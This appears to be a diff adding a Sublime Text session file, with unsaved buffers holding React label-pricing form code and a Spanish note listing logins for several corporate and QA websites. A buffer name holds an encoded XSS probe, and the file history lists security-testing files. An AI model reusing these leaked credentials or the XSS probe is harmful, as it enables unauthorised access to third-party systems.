<input type=\"text\" class=\"form-control\" name=\"tipoPapel\" onChange={this.handleInputChange.bind(this)}/>\n            </div>\n            <div class=\"form-group\">\n                <label for=\"maquinaImp\">Maquina Imprimir</label>\n                <input type=\"text\" class=\"form-control\" name=\"maquinaImp\" onChange={this.handleInputChange.bind(this)}/>\n            </div>\n            <div class=\"form-group\">\n                <label for=\"pDesperdicioPapel\"> Porcentae Desperdicio de Papel</label>\n                <input type=\"text\" class=\"form-control\" name=\"pDesperdicioPapel\" onChange={this.handleInputChange.bind(this)}/>\n            </div>\n            <div class=\"form-group\">\n                <label for=\"pUtilidad\"> Porcentaje utilidad</label>\n                <input type=\"text\" class=\"form-control\" name=\"pUtilidad\" onChange={this.handleInputChange.bind(this)}/>\n            </div>\n            <div class=\"form-group\">\n                <label for=\"numEtiquetas\"> Cantidad Etiquetas</label>\n                <input type=\"text\" class=\"form-control\" name=\"numEtiquetas\" onChange={this.handleInputChange.bind(this)}/>\n            </div>\n          </div>\n\n\n\n        <button type=\"submit\" class=\"btn btn-default\">Submit</button>\n        </form>\n\n      </div>\n      <div class=\"col-md-6\">\n\n      </div> \n      </div>\n\n\n\n      let area= this.getArea();\n      let costoPapel= this.getCostoPapel();\n      let tiempoImp= this.getTiempoImp();\n      let costoOperador= this.getcostoOperador(tiempoImp);\n       if (this.state.tipoImp== '0') {\n      this.state.costoTotal=(area* this.state.numEtiquetas*costoPapel)+(tiempoImp*costoOperador);\n      this.state.costo=this.state.costoTotal/this.state.numEtiquetas;\n      this.state.precio=this.state.costoTotal+(this.state.pUtilidad*100)\n\n    }else if (this.state.tipoImp== '1') {\n      this.state.costoTotal=((area+(this.state.pDesperdicioPapel*100))*this.state.numEtiquetas* costoPapel)+ (((this.state.valueMaquinaImp[parseInt(this.state.maquinaImp)][0]*60)*this.state.numTintas))*costoOperador ;\n      this.state.costo=this.state.costoTotal/this.state.numEtiquetas;\n      this.state.precio=this.state.costoTotal+(this.state.pUtilidad*100)\n    }else if (this.state.tipoImp== '2') {\n      this.state.costoTotal=(area* this.state.numEtiquetas*costoPapel)+((this.state.valueMaquinaImp[parseInt(this.state.maquinaImp)][0]*60)*costoOperador)+(tiempoImp*costoOperador)\n      this.state.costo=this.state.costoTotal/this.state.numEtiquetas;\n      this.state.precio=this.state.costoTotal+(this.state.pUtilidad*100)\n    }\n    event.preventDefault();\n\n    alert('tipo de impresion 1 A name was submitted: ' + costoPapel+ 'area:' + area + 'tiempo de imp: ' + tiempoImp + 'costooperador: '+costoOperador);\n    alert('costo '+this.state.costo+'  total: '+this.state.costoTotal);",
+			"settings":
+			{
+				"buffer_size": 5410,
+				"line_ending": "Unix",
+				"name": "# ruby -run -e httpd . -p 9090"
+			}
+		},
+		{
+			"contents": "Para el sitio  web https://certiweb.ceet.co , para esté sitio no hay ambiente de pruebas solo hay producción  \nDatos para acceso:\nUsuario: 8851492\nContraseña: Password2017\n\nPara el sitio  web https://avisos.ceet.co , para esté sitio no hay ambiente de pruebas solo hay producción  \nDatos para acceso:\nUsuario: segurinfo\nContraseña: S3gur1nf017*\n\n(REQUIERE VPN)\nPara el sitio Web Condolencias  si hay ambiente de pruebas el link de acceso es https://creusa.eltiempo.com.co:8443,  \nDatos para acceso:\nUsuario: cristorey\nContraseña: Inicial2017*\n\n(REQUIERE VPN)\nPara el sitio Web SalesView  si hay ambiente de pruebas el link de acceso es http://creta:8085/app ,  \nDatos para acceso:\nUsuario: seginf\nContraseña: Seguridad2017*\n\nAmbiente de pruebas:  https://qa.clubvivamos.com/como-ser-aliado\nUsuario: pedgal\nContraseña: Segurid@d2017*\n\n\n\nUsuario o contraseña inválida, por favor intente de nuevo.\nUsuario o contraseña inválida, por favor intente de nuevo.\n\n",
+			"settings":
+			{
+				"buffer_size": 955,
+				"line_ending": "Unix",
+				"name": "Para el sitio  web https://certiweb.ceet.co , para"
+			}
+		}
+	],
+	"build_system": "",
+	"build_system_choices":
+	[
+		[
+			[
+				[
+					"Packages/Python/Python.sublime-build",
+					""
+				],
+				[
+					"Packages/Python/Python.sublime-build",
+					"Syntax Check"
+				]
+			],
+			[
+				"Packages/Python/Python.sublime-build",
+				""
+			]
+		]
+	],
+	"build_varint": "",
+	"command_palette":
+	{
+		"height": 392.0,
+		"last_filter": "control",
+		"selected_items":
+		[
+			[
+				"control",
+				"Package Control: Install Package"
+			],
+			[
+				"insta",
+				"Package Control: Install Package"
+			]
+		],
+		"width": 479.0
+	},
+	"console":
+	{
+		"height": 0.0,
+		"history":
+		[
+		]
+	},
+	"distraction_free":
+	{
+		"menu_visible": true,
+		"show_minimap": false,
+		"show_open_files": false,
+		"show_tabs": false,
+		"side_bar_visible": false,
+		"status_bar_visible": false
+	},
+	"expanded_folders":
+	[
+	],
+	"file_history":
+	[
+		"/root/Downloads/fulbolred",
+		"/root/Documents/reactcurso/prueba/1-basic-react/README.md",
+		"/root/Documents/reactcurso/prueba/1-basic-react/note.md",
+		"/root/Documents/reactcurso/prueba/1-basic-react/src/js/components/Layout.js",
+		"/root/Documents/reactcurso/prueba/1-basic-react/src/js/components/Footer.js",
+		"/root/Documents/reactcurso/prueba/1-basic-react/src/js/components/Header.js",
+		"/root/Documents/reactcurso/prueba/1-basic-react/src/index.html",
+		"/root/Documents/reactcurso/prueba/1-basic-react/src/js/components/Header/Title.js",
+		"/root/Documents/reactcurso/prueba/1-basic-react/package.json",
+		"/root/Documents/reactcurso/curso2/hello/node_modules/babel-traverse/lib/visitors.js",
+		"/root/Documents/reactcurso/prueba/1-basic-react/src/js/client.js",
+		"/root/Documents/reactcurso/prueba/1-basic-react/webpack.config.js",
+		"/root/Documents/reactlolapp/app/fullstack_template/static/webpack.config.js",
+		"/root/Documents/reactlolapp/app/fullstack_template/static/js/components/Hello.jsx",
+		"/root/Documents/reactlolapp/app/fullstack_template/static/js/routers.jsx",
+		"/root/Documents/reactcurso/react/webpack.config.js",
+		"/root/Documents/reactcurso/react-filter/app/dist/modulo2.js",
+		"/root/Documents/jspAcademy/datosWeb",
+		"/root/Documents/pythonAcademy/netcat.py",
+		"/root/Documents/pythonAcademy/appMusic/appv1/playlistitem.py",
+		"/root/Documents/pythonAcademy/appMusic/appv1/datos",
+		"/root/Documents/pythonAcademy/appMusic/appv1/test.py",
+		"/root/Documents/pythonAcademy/appMusic/appv1/test2.py",
+		"/root/Documents/pythonAcademy/appMusic/appv1/A1.py-oauth2.json",
+		"/root/Documents/pythonAcademy/appMusic/appv1/back.py",
+		"/root/Documents/pythonAcademy/appMusic/appv1/A1.py",
+		"/root/Documents/pythonAcademy/appMusic/appv1/search.py",
+		"/root/Documents/pythonAcademy/appMusic/appv1/client_secret.json",
+		"/root/Documents/pythonAcademy/appMusic/appv1/quickstart.py",
+		"/root/Documents/pythonAcademy/tcp_server.py",
+		"/root/Documents/pythonAcademy/udp-client.py",
+		"/root/Documents/pythonAcademy/proxy.py",
+		"/root/Documents/python/tcp-client.py",
+		"/root/Documents/python/netcat.py",
+		"/root/Documents/python/netcat",
+		"/root/Documents/python/tcp_server.py",
+		"/root/Documents/sddsdsdd.roo",
+		"/root/Documents/python/udp-client.py",
+		"/root/Documents/python/tcp-client",
+		"/root/Documents/xss tools",
+		"/var/www/html/test/test.html",
+		"/root/Documents/soap.txt",
+		"/root/Documents/soap.rb",
+		"/root/Documents/drfdfsf",
+		"/root/Documents/passworker.rb",
+		"/root/Documents/oup.txt",
+		"/root/Documents/csrf creata",
+		"/root/Documents/nodejs/express/00-basic/1-basic",
+		"/root/Documents/temp/salesDoc/0-Doc",
+		"/root/Documents/TEST.html",
+		"/root/Documents/iframe.html",
+		"/opt/lampp/htdocs/A.JS",
+		"/opt/lampp/htdocs/TEST/ALERT.JS",
+		"/root/Documents/test\\sec.html",
+		"/root/Documents/login.html",
+		"/opt/lampp/htdocs/test/alert.js",
+		"/root/Documents/xs<b>s.html",
+		"/root/Documents/nodejs/curso/promesas.js",
+		"/root/Documents/nodejs/modulosnpm/globales/debugger.js",
+		"/root/Documents/nodejs/modulosnpm/globales/monitor.js",
+		"/root/Documents/nodejs/modulosnpm/subirarchivo/package.json",
+		"/root/Documents/nodejs/modulosnpm/subirarchivo/uploader.js",
+		"/root/Documents/nodejs/curso/http.js",
+		"/root/Documents/nodejs/modulosnpm/globales/debugger",
+		"/root/Documents/nodejs/form.js",
+		"/root/Documents/nodejs/ednode2016/01Core/11-form.js",
+		"/root/Documents/nodejs/ednode2016/01Core/10-http-sniffer.js",
+		"/root/Documents/nodejs/ednode2016/01Core/09-http-cliente.js",
+		"/root/Documents/nodejs/http-client.js",
+		"/root/Documents/nodejs/ednode2016/01Core/08-http-static-site.js",
+		"/root/Documents/nodejs/path.js",
+		"/root/Documents/nodejs/http-fs.js",
+		"/root/Documents/nodejs/ednode2016/01Core/07-http-fs.js",
+		"/root/Documents/nodejs/http-stream.js",
+		"/root/Documents/nodejs/assets/index.html",
+		"/root/Documents/nodejs/http-event.js",
+		"/root/Documents/nodejs/13-event-inherit.js",
+		"/root/Documents/nodejs/mydata.js",
+		"/root/Documents/nodejs/clock.js",
+		"/root/Documents/nodejs/module.js",
+		"/root/Documents/lolapp/server/api_example/api.py",
+		"/root/Documents/nodejs/stream.js",
+		"/root/Documents/nodejs/event-emmiter.js",
+		"/root/Documents/nodejs/stream-proccess.js",
+		"/root/Documents/nodejs/assets/notas.txt",
+		"/root/Documents/nodejs/buffer.js",
+		"/root/Documents/reactlolapp/app/fullstack_template/static/js/index.jsx",
+		"/root/Documents/reactlolapp/app/fullstack_template/static/js/components/App.jsx",
+		"/root/Documents/reactlolapp/app/fullstack_template/static/js/components/Global/Header.js",
+		"/root/Documents/reactcurso/curso2/hello/src/components/Global/Header.js",
+		"/root/Documents/reactlolapp/app/fullstack_template/static/js/components/Global/Footer.js",
+		"/root/Documents/reactlolapp/app/fullstack_template/static/js/components/Global/Content.js",
+		"/root/Documents/reactlolapp/app/fullstack_template/static/js/components/Home/index.js",
+		"/root/Documents/reactcurso/curso2/hello/src/index.js",
+		"/root/Documents/reactcurso/curso2/hello/src/routers.js",
+		"/root/Documents/reactcurso/curso2/hello/src/components/App.js",
+		"/root/Documents/reactlolapp/app/fullstack_template/server/server.py",
+		"/root/Documents/reactlolapp/app/fullstack_template/static/package.json",
+		"/root/Documents/reactlolapp/app/fullstack_template/static/js/App.jsx",
+		"/root/Documents/reactlolapp/app/fullstack_template/static/js/Hello.jsx",
+		"/root/Documents/nodejs/http.js",
+		"/root/Documents/nodejs/process.js",
+		"/root/Documents/lolapp/app/vue/src/components/UserItem.vue",
+		"/root/Documents/lolapp/app/vue/src/components/UserPosts.vue",
+		"/root/Documents/lolapp/app/vue/src/main.js",
+		"/root/Documents/lolapp/app/vue/src/components/Home.vue",
+		"/root/Documents/lolapp/app/vue/src/components/main/footer.vue",
+		"/root/Documents/lolapp/app/vue/src/components/main/nvar.vue",
+		"/root/Documents/lolapp/app/vue/src/components/UserProfile.vue",
+		"/root/Documents/lolapp/app/vue/src/App.vue",
+		"/root/Documents/lolapp/app/vue/webpack.config.js",
+		"/root/Documents/lolapp/app/vue/index.html",
+		"/root/Documents/lolapp/app/vue/package-lock.json",
+		"/root/Documents/lolapp/app/vuejs-videolari/08-router/src/components/UserProfile.vue",
+		"/root/Documents/python/app/web/exploits/models.py",
+		"/root/Documents/reactcurso/curso2/hello/node_modules/asn1.js/lib/asn1/api.js",
+		"/root/Documents/reactcurso/curso2/hello/node_modules/babel-runtime/helpers/asyncGeneratorDelegate.js",
+		"/root/Documents/lolapp/server/main.py",
+		"/root/Documents/lolapp/server/prueba1.py",
+		"/root/Documents/lolapp/server/d1/files/admin.py",
+		"/root/Documents/lolapp/server/d1/files/serializers.py",
+		"/root/Documents/lolapp/server/d1/files/models.py",
+		"/root/Documents/lolapp/server/d1/files/apps.py",
+		"/root/Documents/lolapp/server/d1/files/views.py",
+		"/root/Documents/lolapp/server/d1/files/tests.py",
+		"/media/sf_Documents/prueba.txt",
+		"/root/Documents/reactcurso/curso2/hello/package.json",
+		"/root/Documents/reactcurso/curso2/hello/webpack.config.babel.js"
+	],
+	"find":
+	{
+		"height": 25.0
+	},
+	"find_in_files":
+	{
+		"height": 115.0,
+		"where_history":
+		[
+			"/root/Documents/nodejs/ednode2016"
+		]
+	},
+	"find_state":
+	{
+		"case_sensitive": false,
+		"find_history":
+		[
+			"submit",
+			"apellidos",
+			"apellido",
+			"send",
+			"sed",
+			"else if",
+			"&gt;",
+			"&lt;",
+			"promises",
+			"$",
+			"user-item",
+			"userit",
+			"useri",
+			"useitem",
+			"userite",
+			"user"
+		],
+		"highlight": true,
+		"in_selection": false,
+		"preserve_case": false,
+		"regex": false,
+		"replace_history":
+		[
+			"elif",
+			">",
+			"<"
+		],
+		"reverse": false,
+		"show_context": true,
+		"use_buffer2": true,
+		"whole_word": false,
+		"wrap": true
+	},
+	"folders":
+	[
+		{
+			"path": "/root/Documents/reactcurso"
+		},
+		{
+			"path": "/root/Documents/nodejs"
+		},
+		{
+			"path": "/root/Documents/reactlolapp"
+		},
+		{
+			"path": "/root/Documents/pythonAcademy"
+		},
+		{
+			"path": "/root/Documents/jspAcademy"
+		}
+	],
+	"groups":
+	[
+		{
+			"selected": 6,
+			"sheets":
+			[
+				{
+					"buffer": 0,
+					"semi_transient": false,
+					"settings":
+					{
+						"buffer_size": 2177,
+						"regions":
+						{
+						},
+						"selection":
+						[
+							[
+								1469,
+								1469
+							]
+						],
+						"settings":
+						{
+							"auto_name": "&lt;",
+							"syntax": "Packages/Text/Plain text.tmLanguage"
+						},
+						"translation.x": 0.0,
+						"translation.y": 0.0,
+						"zoom_level": 1.0
+					},
+					"stack_index": 6,
+					"type": "text"
+				},
+				{
+					"buffer": 1,
+					"semi_transient": false,
+					"settings":
+					{
+						"buffer_size": 1480,
+						"regions":
+						{
+						},
+						"selection":
+						[
+							[
+								1480,
+								1480
+							]
+						],
+						"settings":
+						{
+							"auto_name": "%uff1cscript%uff1ealert(360);%uff1c/script%uff1e",
+							"syntax": "Packages/Text/Plain text.tmLanguage"
+						},
+						"translation.x": 0.0,
+						"translation.y": 0.0,
+						"zoom_level": 1.0
+					},
+					"stack_index": 4,
+					"type": "text"
+				},
+				{
+					"buffer": 2,
+					"file": "/root/Documents/pythonAcademy/scrapyexample.py",
+					"semi_transient": false,
+					"settings":
+					{
+						"buffer_size": 142,
+						"regions":
+						{
+						},
+						"selection":
+						[
+							[
+								142,
+								142
+							]
+						],
+						"settings":
+						{
+							"auto_name": "s",
+							"syntax": "Packages/Python/Python.sublime-syntax"
+						},
+						"translation.x": 0.0,
+						"translation.y": 0.0,
+						"zoom_level": 1.0
+					},
+					"stack_index": 5,
+					"type": "text"
+				},
+				{
+					"buffer": 3,
+					"semi_transient": false,
+					"settings":
+					{
+						"buffer_size": 1345,
+						"regions":
+						{
+						},
+						"selection":
+						[
+							[
+								1187,
+								1187
+							]
+						],
+						"settings":
+						{
+							"auto_name": "precios por ciudad",
+							"syntax": "Packages/Text/Plain text.tmLanguage"
+						},
+						"translation.x": 0.0,
+						"translation.y": 0.0,
+						"zoom_level": 1.0
+					},
+					"stack_index": 3,
+					"type": "text"
+				},
+				{
+					"buffer": 4,
+					"semi_transient": false,
+					"settings":
+					{
+						"buffer_size": 6986,
+						"regions":
+						{
+						},
+						"selection":
+						[
+							[
+								0,
+								6986
+							]
+						],
+						"settings":
+						{
+							"auto_name": "cadf40e5-6f40-4160-a79d-498041b2dd41",
+							"syntax": "Packages/Text/Plain text.tmLanguage"
+						},
+						"translation.x": 0.0,
+						"translation.y": 1530.0,
+						"zoom_level": 1.0
+					},
+					"stack_index": 2,
+					"type": "text"
+				},
+				{
+					"buffer": 5,
+					"semi_transient": false,
+					"settings":
+					{
+						"buffer_size": 114,
+						"regions":
+						{
+						},
+						"selection":
+						[
+							[
+								114,
+								114
+							]
+						],
+						"settings":
+						{
+							"syntax": "Packages/Text/Plain text.tmLanguage"
+						},
+						"translation.x": 0.0,
+						"translation.y": 0.0,
+						"zoom_level": 1.0
+					},
+					"stack_index": 1,
+					"type": "text"
+				},
+				{
+					"buffer": 6,
+					"semi_transient": false,
+					"settings":
+					{
+						"buffer_size": 4171,
+						"regions":
+						{
+						},
+						"selection":
+						[
+							[
+								1150,
+								1150
+							]
+						],
+						"settings":
+						{
+							"auto_name": "Peticion original",
+							"syntax": "Packages/Text/Plain text.tmLanguage"
+						},
+						"translation.x": 0.0,
+						"translation.y": 241.0,
+						"zoom_level": 1.0
+					},
+					"stack_index": 0,
+					"type": "text"
+				}
+			]
+		},
+		{
+			"selected": 0,
+			"sheets":
+			[
+				{
+					"buffer": 7,
+					"semi_transient": false,
+					"settings":
+					{
+						"buffer_size": 5410,
+						"regions":
+						{
+						},
+						"selection":
+						[
+							[
+								3603,
+								3603
+							]
+						],
+						"settings":
+						{
+							"auto_name": "# ruby -run -e httpd . -p 9090",
+							"syntax": "Packages/Text/Plain text.tmLanguage"
+						},
+						"translation.x": 0.0,
+						"translation.y": 38489.0,
+						"zoom_level": 1.0
+					},
+					"stack_index": 7,
+					"type": "text"
+				},
+				{
+					"buffer": 8,
+					"semi_transient": false,
+					"settings":
+					{
+						"buffer_size": 955,
+						"regions":
+						{
+						},
+						"selection":
+						[
+							[
+								173,
+								173
+							]
+						],
+						"settings":
+						{
+							"auto_name": "Para el sitio  web https://certiweb.ceet.co , para",
+							"syntax": "Packages/Text/Plain text.tmLanguage"
+						},
+						"translation.x": 0.0,
+						"translation.y": 0.0,
+						"zoom_level": 1.0
+					},
+					"stack_index": 8,
+					"type": "text"
+				}
+			]
+		}
+	],
+	"incremental_find":
+	{
+		"height": 25.0
+	},
+	"input":
+	{
+		"height": 42.0
+	},
+	"layout":
+	{
+		"cells":
+		[
+			[
+				0,
+				0,
+				1,
+				1
+			],
+			[
+				1,
+				0,
+				2,
+				1
+			]
+		],
+		"cols":
+		[
+			0.0,
+			0.811910882606,
+			1.0
+		],
+		"rows":
+		[
+			0.0,
+			1.0
+		]
+	},
+	"menu_visible": true,
+	"output.exec":
+	{
+		"height": 242.0
+	},
+	"output.find_results":
+	{
+		"height": 0.0
+	},
+	"output.nodejs":
+	{
+		"height": 182.0
+	},
+	"pinned_build_system": "Packages/User/python3.sublime-build",
+	"project": "",
+	"replace":
+	{
+		"height": 46.0
+	},
+	"save_all_on_build": true,
+	"select_file":
+	{
+		"height": 0.0,
+		"last_filter": "",
+		"selected_items":
+		[
+		],
+		"width": 0.0
+	},
+	"select_project":
+	{
+		"height": 0.0,
+		"last_filter": "",
+		"selected_items":
+		[
+		],
+		"width": 0.0
+	},
+	"select_symbol":
+	{
+		"height": 0.0,
+		"last_filter": "",
+		"selected_items":
+		[
+		],
+		"width": 0.0
+	},
+	"selected_group": 0,
+	"settings":
+	{
+	},
+	"show_minimap": true,
+	"show_open_files": false,
+	"show_tabs": true,
+	"side_bar_visible": true,
+	"side_bar_width": 273.0,
+	"status_bar_visible": true,
+	"template_settings":
+	{
+	}
+}
